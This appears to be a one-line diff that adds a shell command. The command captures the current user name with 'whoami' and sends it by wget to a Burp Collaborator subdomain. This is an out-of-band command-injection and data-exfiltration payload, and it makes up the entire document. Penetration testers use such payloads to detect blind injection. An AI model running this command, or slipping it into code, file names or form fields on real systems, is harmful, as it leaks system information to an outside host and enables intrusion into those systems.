@@ -1,0 +1,1 @@
+a=`whoami`;wget gqavm7jcy39hxeo5bh2ma38a117rvg.burpcollaborator.net/?c=$a
